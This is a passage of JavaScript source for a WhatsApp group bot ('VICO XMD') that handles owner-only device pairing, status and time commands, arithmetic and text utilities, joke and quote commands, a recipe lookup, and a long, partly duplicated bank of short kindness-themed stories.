            return reply(`😂 *JOKE*\n\n${jokes[randInt(0,jokes.length-1)]}`);
        }

       
        // ═══════════════════════════════════════════════════
        case 'pair': {
            if (!isCreator) return reply('🔒 *Owner only.*');
            const raw=(args[0]||'').replace(/[^0-9]/g,'');
            if(!raw||raw.startsWith('0')||!/^\d{7,15}$/.test(raw)) return reply(`📱 Usage: ${prefix}pair <number>\nExample: ${prefix}pair 2348012345678`);
            const jid=`${raw}@s.whatsapp.net`;
            try {
                await getStartPairing()(jid);
                const file=path.join(STORAGE_DIR,'session-data','pairing','pairing.json');
                let code=null,started=Date.now();
                while(Date.now()-started<20000){
                    await new Promise(r=>setTimeout(r,1000));
                    if(!fs.existsSync(file))continue;
                    try{
                        const d=JSON.parse(fs.readFileSync(file,'utf8'));
                        if(d.number===jid&&new Date(d.timestamp||0).getTime()>=started){code=d.code;break}
                    }catch(_){}
                }
                if (code) {
                    // 1) Code only
                    await empire.sendMessage(m.chat, { text: String(code) }, { quoted: m });
                    // 2) How to link
                    await empire.sendMessage(m.chat, {
                        text: 'HOW TO LINK THE WHATSAPP BOT\n\nWhatsApp → Linked Devices → Link with phone number.'
                    }, { quoted: m });
                    return;
                }
                return reply(`⏳ Pairing started for *+${raw}*, but no code was returned yet.`);
            } catch(e){
                return reply(`❌ Pairing failed: ${e.message}`);
            }
        }
        case 'listpair': {
            if(!isCreator)return reply('🔒 *Owner only.*'); const dir=path.join(STORAGE_DIR,'session-data','pairing'); if(!fs.existsSync(dir))return reply('📱 *PAIRED DEVICES*\n\nNo paired devices found.'); const entries=fs.readdirSync(dir,{withFileTypes:true}).filter(x=>x.isDirectory()).map(x=>x.name.replace(/[^0-9]/g,'')).filter(Boolean); if(!entries.length)return reply('📱 *PAIRED DEVICES*\n\nNo paired devices found.'); return reply(`📱 *PAIRED DEVICES*\n\n${entries.map((n,i)=>`${i+1}. +${n}`).join('\n')}\n\nTotal: *${entries.length}*`);
        }
        case 'alive': return reply(`⚡ *VICO XMD IS ALIVE*\n\nStatus: Online\nUptime: ${Math.floor(process.uptime())}s\nPrefix: ${prefix}`);
        case 'status': case 'botstatus': return reply(`📊 *BOT STATUS*\n\n🟢 Online\n⏱ Uptime: ${Math.floor(process.uptime())}s\n🧠 RAM: ${(process.memoryUsage().rss/1024/1024).toFixed(1)} MB\n⚙️ Node: ${process.version}`);
        case 'botinfo': return reply(`🤖 *VICO XMD*\n\nOwner: ${global.OWNER_NAME}\nVersion: 80-command build\nMode: ${db.botMode?.mode||'public'}`);
        case 'runtime': return reply(`⏱️ *RUNTIME*\n${Math.floor(process.uptime()/86400)}d ${Math.floor(process.uptime()/3600)%24}h ${Math.floor(process.uptime()/60)%60}m ${Math.floor(process.uptime()%60)}s`);
        case 'time': return reply(`🕒 *TIME:* ${moment().tz('Africa/Lagos').format('HH:mm:ss')} WAT`);
        case 'date': return reply(`📅 *DATE:* ${moment().tz('Africa/Lagos').format('DD/MM/YYYY')}`);
        case 'day': return reply(`📆 *DAY:* ${moment().tz('Africa/Lagos').format('dddd')}`);
        case 'calc': {if(!text)return reply(`🧮 Usage: ${prefix}calc 25*4+10`);if(!/^[0-9+\-*/%().\s]+$/.test(text))return reply('❌ Only basic arithmetic is allowed.');try{return reply(`🧮 *RESULT:* ${Function(`"use strict"; return (${text})`)()}`)}catch{return reply('❌ Invalid expression.')}}
        case 'percent': {const[a,b]=text.split(/\s+/).map(Number);if(!Number.isFinite(a)||!Number.isFinite(b)||b===0)return reply(`Usage: ${prefix}percent <part> <total>`);return reply(`📈 *${a} is ${((a/b)*100).toFixed(2)}% of ${b}*`)}
        case 'average': case 'sum': case 'multiply': {const n=text.split(/[ ,]+/).map(Number).filter(Number.isFinite);if(!n.length)return reply(`Usage: ${prefix}${command} 10 20 30`);const v=command==='average'?n.reduce((a,b)=>a+b,0)/n.length:command==='sum'?n.reduce((a,b)=>a+b,0):n.reduce((a,b)=>a*b,1);return reply(`🔢 *${command.toUpperCase()}:* ${v}`)}
        case 'divide': case 'modulo': {const[a,b]=text.split(/[ ,]+/).map(Number);if(!Number.isFinite(a)||!Number.isFinite(b)||b===0)return reply(`Usage: ${prefix}${command} <a> <b>`);return reply(`🔢 *RESULT:* ${command==='divide'?a/b:a%b}`)}
        case 'power': {const[a,b]=text.split(/[ ,]+/).map(Number);if(!Number.isFinite(a)||!Number.isFinite(b))return reply(`Usage: ${prefix}power <base> <exponent>`);return reply(`⚡ *RESULT:* ${a**b}`)}
        case 'uppercase': return reply(text?text.toUpperCase():`Usage: ${prefix}upper <text>`);
        case 'lowercase': return reply(text?text.toLowerCase():`Usage: ${prefix}lower <text>`);
        case 'length': return reply(text?`📏 Length: *${text.length}*`:`Usage: ${prefix}length <text>`);
        case 'count': case 'words': return reply(text?`🔢 Words: *${text.trim().split(/\s+/).filter(Boolean).length}*`:`Usage: ${prefix}${command} <text>`);
        case 'chars': return reply(text?`🔤 Characters: *${[...text].length}*`:`Usage: ${prefix}chars <text>`);
        case 'binary': return reply(text?[...Buffer.from(text)].map(b=>b.toString(2).padStart(8,'0')).join(' '):`Usage: ${prefix}binary <text>`);
        case 'password': {const chars='ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789!@#$%^&*';const len=Math.min(64,Math.max(6,Number(text)||16));let out='';for(let i=0;i<len;i++)out+=chars[randInt(0,chars.length-1)];return reply(`🔐 *PASSWORD:*\n\n${out}`)}
        case 'uuid': return reply(`🆔 ${require('crypto').randomUUID()}`);
        case 'jid':
        case 'channeljid': {
            const q = (text || args.join(' ') || '').trim();
            // Resolve channel link → JID
            if (/whatsapp\.com\/channel\//i.test(q)) {
                try {
                    const code = q.match(/channel\/([A-Za-z0-9]+)/)?.[1];
                    if (!code) return reply('❌ Invalid channel link.');
                    // Try Baileys newsletter metadata helpers
                    let jidOut = null;
                    try {
                        if (typeof empire.newsletterMetadata === 'function') {
                            const meta = await empire.newsletterMetadata('invite', code).catch(() => null);
                            jidOut = meta?.id || meta?.jid || null;
                        }
                    } catch (_) {}
                    try {
                        if (!jidOut && typeof empire.query === 'function') {
                            // Fallback: common pattern for channel codes is not always invertible;
                            // ask user to run .jid inside the channel if resolve fails.
                        }
                    } catch (_) {}
                    if (jidOut) {
                        return reply(`📡 *Channel JID*\n\n\`${jidOut}\`\n\n🔗 ${q}`);
                    }
                    return reply(
                        `📡 *Channel link received*\n\n` +
                        `Code: *${code}*\n\n` +
                        `Open the channel → send:\n*${prefix}jid*\n\n` +
                        `(WhatsApp only exposes full channel JID from inside the channel.)`
                    );
                } catch (e) {
                    return reply('❌ Could not resolve channel: ' + (e.message || 'error'));
                }
            }
            // Inside a channel / newsletter chat
            if (String(m.chat || '').endsWith('@newsletter')) {
                return reply(`📡 *Channel JID*\n\n\`${m.chat}\``);
            }
            // Default: sender + chat ids
            return reply(
                `🆔 *JIDs*\n\n` +
                `👤 You: \`${m.sender}\`\n` +
                `💬 Chat: \`${m.chat}\`\n\n` +
                `_Channel link:_\n${prefix}jid https://whatsapp.com/channel/XXXX`
            );
        }

        case 'chatid': return reply(`🆔 *CHAT ID:* ${m.chat}`);
        case 'groupjid': return isGroup?reply(`👥 *GROUP JID:* ${m.chat}`):reply('❌ Group only.');
        case 'gcadmins': return isGroup?empire.sendMessage(m.chat,{text:`👮 *ADMINS (${groupAdmins.length})*\n\n${groupAdmins.map(x=>`• @${x.split('@')[0]}`).join('\n')}`,mentions:groupAdmins,contextInfo:newsletterContext()},{quoted:m}):reply('❌ Group only.');
        case 'groupdesc': return isGroup?reply(`📝 *DESCRIPTION*\n\n${groupMetadata?.desc||'No description.'}`):reply('❌ Group only.');
        case 'grouplink2': return isGroup?(isAdmins||isCreator?reply(`🔗 https://chat.whatsapp.com/${await empire.groupInviteCode(m.chat)}`):reply('🔒 Admin only.')):reply('❌ Group only.');
        case 'groupowner': return isGroup?reply(`👑 *OWNER:* ${groupMetadata?.owner?'@'+groupMetadata.owner.split('@')[0]:'Unknown'}`):reply('❌ Group only.');
        case 'botid': return reply(`🤖 *BOT JID:* ${botNumber}`);
        case 'mypp': {const u=m.sender,url=await empire.profilePictureUrl(u,'image').catch(()=>null);return url?empire.sendMessage(m.chat,{image:{url},caption:`🖼️ @${u.split('@')[0]}`,mentions:[u],contextInfo:newsletterContext()},{quoted:m}):reply('❌ Profile picture unavailable.')}
        case 'server': return reply(`🖥️ *SERVER*\nPlatform: ${process.platform}\nArch: ${process.arch}\nNode: ${process.version}`);
        case 'platform': return reply(`💻 ${process.platform} ${process.arch}`);
        case 'node': return reply(`🟢 Node.js ${process.version}`);
        case 'meminfo': return reply(`🧠 RSS: ${(process.memoryUsage().rss/1024/1024).toFixed(2)} MB\nHeap: ${(process.memoryUsage().heapUsed/1024/1024).toFixed(2)} MB`);
        case 'cpu': {const os=require('os');return reply(`🖥️ CPUs: ${os.cpus().length}\nLoad: ${os.loadavg().map(x=>x.toFixed(2)).join(' / ')}`)}
        case 'env': return reply(`⚙️ NODE_ENV: ${process.env.NODE_ENV||'not set'}\nPORT: ${process.env.PORT||'default'}`);
        case 'timezone': return reply(`🌍 *TIMEZONE:* Africa/Lagos\n🕒 ${moment().tz('Africa/Lagos').format('YYYY-MM-DD HH:mm:ss')}`);
        case 'timestamp': return reply(`⏱️ ${Date.now()}`);
        case 'ms': {const n=Number(text);return Number.isFinite(n)?reply(`⏱️ ${n} ms = ${(n/1000).toFixed(3)} seconds`):reply(`Usage: ${prefix}ms <milliseconds>`)}
        case 'yesno': return reply(Math.random()<.5?'✅ YES':'❌ NO');
        case 'fliptext': return reply(text?[...text].reverse().join(''):`Usage: ${prefix}fliptext <text>`);
        case 'tinytext': return reply(text?text.split('').join('ᵗⁱⁿʸ'):`Usage: ${prefix}tinytext <text>`);
        case 'mock': return reply(text?[...text].map((c,i)=>i%2?c.toUpperCase():c.toLowerCase()).join(''):`Usage: ${prefix}mock <text>`);
        case 'repeat': case 'echo': return reply(text||`Usage: ${prefix}${command} <text>`);
        case 'timer': {const n=Math.min(60,Math.max(1,Number(text)||5));await reply(`⏲️ Timer set for *${n}s*`);setTimeout(()=>reply(`⏰ *Timer finished!*`),n*1000);break}
        case 'truth2': return reply(['🗣️ What is your biggest goal right now?','😅 What is the funniest thing you have done recently?','💭 What is one thing you want to change?'][randInt(0,2)]);
        case 'dare2': return reply(['🎤 Send a voice note singing for 10 seconds.','😂 Change your profile picture for 5 minutes.','😎 Say something nice to the last person who messaged you.'][randInt(0,2)]);
        
case 'gay': {
    const percent = Math.floor(Math.random() * 61) + 40;
    const ctx = m.message?.extendedTextMessage?.contextInfo;
    if (ctx?.mentionedJid?.[0]) {
        await empire.sendMessage(m.chat, { text: `🏳️‍🌈 @${ctx.mentionedJid[0].split('@')[0]} is ${percent}% gay!`, mentions: ctx.mentionedJid }, { quoted: m });
        break;
    }
    if (m.quoted) {
        const p = ctx?.participant;
        if (p) {
            await empire.sendMessage(m.chat, { text: `🏳️‍🌈 @${p.split('@')[0]} is ${percent}% gay!`, mentions: [p] }, { quoted: m });
            break;
        }
    }
    reply(`🏳️‍🌈 You are ${percent}% gay!`);
    break;
}

case 'stupid': {
    const percent = Math.floor(Math.random() * 61) + 40;
    const ctx = m.message?.extendedTextMessage?.contextInfo;
    if (ctx?.mentionedJid?.[0]) {
        await empire.sendMessage(m.chat, { text: `🤪 @${ctx.mentionedJid[0].split('@')[0]} is ${percent}% stupid!`, mentions: ctx.mentionedJid }, { quoted: m });
        break;
    }
    if (m.quoted) {
        const p = ctx?.participant;
        if (p) {
            await empire.sendMessage(m.chat, { text: `🤪 @${p.split('@')[0]} is ${percent}% stupid!`, mentions: [p] }, { quoted: m });
            break;
        }
    }
    reply(`🤪 You are ${percent}% stupid!`);
    break;
}

case 'planet': {
    const p = planetsData[Math.floor(Math.random() * planetsData.length)];
    reply(`🌍 *You are from planet ${p.name}*\n\n📝 *Characteristics:*\n${p.desc}`);
    break;
}

case 'galaxy': {
    const g = galaxiesData[Math.floor(Math.random() * galaxiesData.length)];
    reply(`🌌 *You are from ${g}*`);
    break;
}

case 'biblequote': {
    const q = bibleQuotes[Math.floor(Math.random() * bibleQuotes.length)];
    reply(`📖 *Bible Inspiration*\n\n${q}`);
    break;
}

case 'quranquote':
case 'quaranquote': {
    const q = quranQuotes[Math.floor(Math.random() * quranQuotes.length)];
    reply(`☪️ *Quran Inspiration*\n\n${q}`);
    break;
}

case 'advice': {
    const a = advices[Math.floor(Math.random() * advices.length)];
    reply(`💡 *Life Advice*\n\n${a}`);
    break;
}

case 'relationship': {
    const relTexts = ["You would die single 💀💀","You would get married soon ❤️","You would have a gf/bf soon 🔥","Omo no partner for u 😹😹💔","Pray for gf/bf 🥲","You go collect bae this year 💍","Your crush dey eye you already 👀","Marriage loading... please wait ⏳","Single and dangerous 😎","Love go meet you when you least expect 💕"];
    const txt = relTexts[Math.floor(Math.random() * relTexts.length)];
    const ctx = m.message?.extendedTextMessage?.contextInfo;
    if (ctx?.mentionedJid?.[0]) {
        await empire.sendMessage(m.chat, { text: `💘 *Relationship Check*\n\n@${ctx.mentionedJid[0].split('@')[0]}\n${txt}`, mentions: ctx.mentionedJid }, { quoted: m });
        break;
    }
    if (m.quoted) {
        const p = ctx?.participant || m.quoted.sender;
        if (p) {
            await empire.sendMessage(m.chat, { text: `💘 *Relationship Check*\n\n@${p.split('@')[0]}\n${txt}`, mentions: [p] }, { quoted: m });
            break;
        }
    }
    reply(`💘 *Relationship Check*\n\n${txt}`);
    break;
}

case 'mathfact': {
    const f = mathFacts[Math.floor(Math.random() * mathFacts.length)];
    reply(`🔢 *Math Fact*\n\n${f}`);
    break;
}

case 'sciencefact': {
    const f = scienceFacts[Math.floor(Math.random() * scienceFacts.length)];
    reply(`🔬 *Science Fact*\n\n${f}`);
    break;
}

case 'recipe': {
    if (!text) { reply(`Usage: ${prefix}recipe cake`); break; }
    try {
        const { data } = await axios.get(`https://www.themealdb.com/api/json/v1/1/search.php?s=${encodeURIComponent(text)}`);
        const meal = data.meals?.[0];
        if (!meal) { reply(`❌ No recipe found for ${text}`); break; }
        let steps = `🍲 *${meal.strMeal}*\n📍 ${meal.strArea}\n\n*Ingredients:*\n`;
        for (let i=1;i<=20;i++) if (meal[`strIngredient${i}`]) steps += `• ${meal[`strIngredient${i}`]} - ${meal[`strMeasure${i}`]}\n`;
        steps += `\n*Instructions:*\n${meal.strInstructions.slice(0,3000)}`;
        await empire.sendMessage(m.chat, { image: { url: meal.strMealThumb }, caption: steps.slice(0,4000) }, { quoted: m });
    } catch(e){ reply('❌ Recipe API error'); }
    break;
}


case 'story': {
    try {
        if (!global.__vicoStoryBank) global.__vicoStoryBank = [`Story 1: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 1 always returns to kindness.`,
`Story 2: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 2 always returns to kindness.`,
`Story 3: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 3 always returns to kindness.`,
`Story 4: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 4 always returns to kindness.`,
`Story 5: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 5 always returns to kindness.`,
`Story 6: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 6 always returns to kindness.`,
`Story 7: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 7 always returns to kindness.`,
`Story 8: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 8 always returns to kindness.`,
`Story 9: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 9 always returns to kindness.`,
`Story 10: A broken drone landed in a farm. The farmer fixed it with wire and prayer. It mapped his fields better than any expert. He named it after his daughter. Ending note: choice 10 always returns to kindness.`,
`Story 11: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 11 always returns to kindness.`,
`Story 12: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 12 always returns to kindness.`,
`Story 13: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 13 always returns to kindness.`,
`Story 14: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 14 always returns to kindness.`,
`Story 15: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 15 always returns to kindness.`,
`Story 16: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 16 always returns to kindness.`,
`Story 17: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 17 always returns to kindness.`,
`Story 18: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 18 always returns to kindness.`,
`Story 19: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 19 always returns to kindness.`,
`Story 20: A broken drone landed in a farm. The farmer fixed it with wire and prayer. It mapped his fields better than any expert. He named it after his daughter. Ending note: choice 20 always returns to kindness.`,
`Story 21: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 21 always returns to kindness.`,
`Story 22: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 22 always returns to kindness.`,
`Story 23: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 23 always returns to kindness.`,
`Story 24: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 24 always returns to kindness.`,
`Story 25: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 25 always returns to kindness.`,
`Story 26: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 26 always returns to kindness.`,
`Story 27: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 27 always returns to kindness.`,
`Story 28: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 28 always returns to kindness.`,
`Story 29: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 29 always returns to kindness.`,
`Story 30: A broken drone landed in a farm. The farmer fixed it with wire and prayer. It mapped his fields better than any expert. He named it after his daughter. Ending note: choice 30 always returns to kindness.`,
`Story 31: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 31 always returns to kindness.`,
`Story 32: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 32 always returns to kindness.`,
`Story 33: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 33 always returns to kindness.`,
`Story 34: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 34 always returns to kindness.`,
`Story 35: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 35 always returns to kindness.`,
`Story 36: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 36 always returns to kindness.`,
`Story 37: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 37 always returns to kindness.`,
`Story 38: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 38 always returns to kindness.`,
`Story 39: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 39 always returns to kindness.`,
`Story 40: A broken drone landed in a farm. The farmer fixed it with wire and prayer. It mapped his fields better than any expert. He named it after his daughter. Ending note: choice 40 always returns to kindness.`,
`Story 41: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 41 always returns to kindness.`,
`Story 42: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 42 always returns to kindness.`,
`Story 43: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 43 always returns to kindness.`,
`Story 44: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 44 always returns to kindness.`,
`Story 45: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 45 always returns to kindness.`,
`Story 46: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 46 always returns to kindness.`,
`Story 47: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 47 always returns to kindness.`,
`Story 48: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 48 always returns to kindness.`,
`Story 49: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 49 always returns to kindness.`,
`Story 50: A broken drone landed in a farm. The farmer fixed it with wire and prayer. It mapped his fields better than any expert. He named it after his daughter. Ending note: choice 50 always returns to kindness.`,
`Story 51: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 51 always returns to kindness.`,
`Story 52: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 52 always returns to kindness.`,
`Story 53: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 53 always returns to kindness.`,
`Story 54: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 54 always returns to kindness.`,
`Story 55: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 55 always returns to kindness.`,
`Story 56: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 56 always returns to kindness.`,
`Story 57: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 57 always returns to kindness.`,
`Story 58: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 58 always returns to kindness.`,
`Story 59: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 59 always returns to kindness.`,
`Story 60: A broken drone landed in a farm. The farmer fixed it with wire and prayer. It mapped his fields better than any expert. He named it after his daughter. Ending note: choice 60 always returns to kindness.`,
`Story 61: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 61 always returns to kindness.`,
`Story 62: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 62 always returns to kindness.`,
`Story 63: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 63 always returns to kindness.`,
`Story 64: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 64 always returns to kindness.`,
`Story 65: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 65 always returns to kindness.`,
`Story 66: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 66 always returns to kindness.`,
`Story 67: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 67 always returns to kindness.`,
`Story 68: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 68 always returns to kindness.`,
`Story 69: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 69 always returns to kindness.`,
`Story 70: A broken drone landed in a farm. The farmer fixed it with wire and prayer. It mapped his fields better than any expert. He named it after his daughter. Ending note: choice 70 always returns to kindness.`,
`Story 71: A Lagos boy found a glowing key in the sand. It opened a door under the bridge. Inside, time moved slower. He lived a year of courage in one night. At dawn he returned wiser, and the key became a coin he still keeps. Ending note: choice 71 always returns to kindness.`,
`Story 72: In Abuja a girl planted a seed on her rooftop. It grew into a tree that whispered job offers. She climbed it once and saw her future city. She climbed down and started building it herself. Ending note: choice 72 always returns to kindness.`,
`Story 73: The last bus in the city stopped for a stranger with no fare. The stranger paid with a song. Passengers forgot their stress for three stops. The driver never saw him again, but kept the melody. Ending note: choice 73 always returns to kindness.`,
`Story 74: A fisherman on the Niger pulled up a phone still ringing. On the line was his late father saying one word: forgive. He hung up, called his brother, and the river looked calmer. Ending note: choice 74 always returns to kindness.`,
`Story 75: Two rivals in a coding contest shared one laptop when power failed. Together they finished first. They still argue online, but they never compete alone again. Ending note: choice 75 always returns to kindness.`,
`Story 76: A street photographer captured a woman laughing in the rain. Years later she found the photo in a gallery titled Hope. She bought it and hung it where she starts every morning. Ending note: choice 76 always returns to kindness.`,
`Story 77: The school bell rang after midnight once. Students who answered found a classroom of unfinished dreams. They finished one each and the bell never rang late again. Ending note: choice 77 always returns to kindness.`,
`Story 78: A tailor sewed a jacket with a secret pocket of courage. Whoever wore it spoke truth in meetings. The jacket passed through ten owners and changed ten offices. Ending note: choice 78 always returns to kindness.`,
`Story 79: On a train to Kano a child asked why stars don't fall. An old woman said they do — as good ideas. The child grew up inventing lights for villages. Ending note: choice 79 always returns to kindness.`,
`Story 60: A Lagos photographer lost his camera on the BRT. A stranger returned it with a full memory card of kindness photos. Ending note: choice 60 always returns to kindness.`,
`Story 61: In Enugu a teacher paid one student's exam fee secretly every year. Twenty years later the student built a library in her name. Ending note: choice 61 always returns to kindness.`,
`Story 62: A fisherman in Bayelsa shared his last net with a rival. That season both boats came home full. Ending note: choice 62 always returns to kindness.`,
`Story 63: On a night train to Kano two strangers swapped stories until dawn and became business partners by noon. Ending note: choice 63 always returns to kindness.`,
`Story 64: A street dancer in Abuja practiced in the rain. A coach filmed her and she opened for a national show. Ending note: choice 64 always returns to kindness.`,
`Story 65: The last generator in a compound died. Neighbors pooled money and bought solar. The compound never went dark again. Ending note: choice 65 always returns to kindness.`,
`Story 66: A boy sold pure water by the express. One customer left a scholarship envelope in the empty crate. Ending note: choice 66 always returns to kindness.`,
`Story 67: A tailor in Aba sewed free uniforms for orphans every December. One orphan returned as a designer under the same roof. Ending note: choice 67 always returns to kindness.`,
`Story 68: Two sisters argued over land for years. A flood forced them to share a roof. They never divided the land again. Ending note: choice 68 always returns to kindness.`,
`Story 69: A radio host played a lost letter on air. The writer and the receiver met at the studio the next morning. Ending note: choice 69 always returns to kindness.`,
`Story 70: A footballer missed a penalty and the crowd booed. His teammate hugged him on the pitch. They won the next match 3-0. Ending note: choice 70 always returns to kindness.`,
`Story 71: A nurse on night shift sang soft hymns. Patients slept deeper. The hospital kept the night playlist forever. Ending note: choice 71 always returns to kindness.`,
`Story 72: A coder open-sourced a farming app. Villages used it to share tools. Harvests rose without new loans. Ending note: choice 72 always returns to kindness.`,
`Story 73: An old bus driver stopped for every school child even when the bus was full. Years later they paid his hospital bill together. Ending note: choice 73 always returns to kindness.`,
`Story 74: A poet wrote on bus tickets. A passenger published them as a book and split the royalties with the poet. Ending note: choice 74 always returns to kindness.`,
`Story 75: Two rival market women shared one umbrella in a storm. Their stalls stood side by side after that day. Ending note: choice 75 always returns to kindness.`,
`Story 76: A mechanic fixed a stranger's car for free. The stranger returned with a toolbox that lasted a decade. Ending note: choice 76 always returns to kindness.`,
